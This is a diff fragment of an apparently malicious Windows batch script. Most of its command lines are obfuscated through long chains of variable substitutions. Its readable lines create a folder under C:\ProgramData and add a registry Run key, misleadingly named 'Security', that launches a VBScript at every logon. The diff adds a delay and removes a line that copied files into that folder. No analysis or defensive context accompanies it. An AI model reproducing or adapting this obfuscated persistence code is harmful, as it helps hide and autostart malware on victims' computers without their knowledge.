@@ -1741,9 +1741,9 @@ set aaaaaaaaaaaaaaaaaaaaaaaaaaa=z
 %aaaaa%%aaaaaa%%aaaaaaaaaaaaa% /%aaaaaaaaaaaaaaaaaa% /%aaaaaaa% %%aaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaa%%aaaaaa%%aaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaaa%%aaaaaa%%\%%aaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaa%%aaaaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaaa%%\%aaaaaa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaaaa%\%aaaaaaaaaa%%aaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaaaaaaa%\*.%aaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaa%%aaaaaa% >> %aaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaa%
 %aaaaa%%aaaaaa%%aaaaaaaaaaaaa% /%aaaaaaaaaaaaaaaaaa% /%aaaaaaa% %%aaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaa%%aaaaaa%%aaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaaa%%aaaaaa%%\%%aaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaa%%aaaaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaaa%%\%aaaaaa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaaaa%\%aaaaaaaaaa%%aaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaaaaaaa%\*.%aaaaa%%aaaaaaaaaaaaa%%aaaaaaaaaaaaa% >> %aaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaa%
 %aaaa%%aaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%
+timeout 1 >> nul
 mkdir "C:\ProgramData\PSU" >> nul
 timeout 1 >> nul
-copy /Y "*" "C:\ProgramData\PSU" >> nul
 REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Security" /t REG_SZ /F /D "C:\ProgramData\PSU\start.vbs"
 timeout 1 >> nul
 
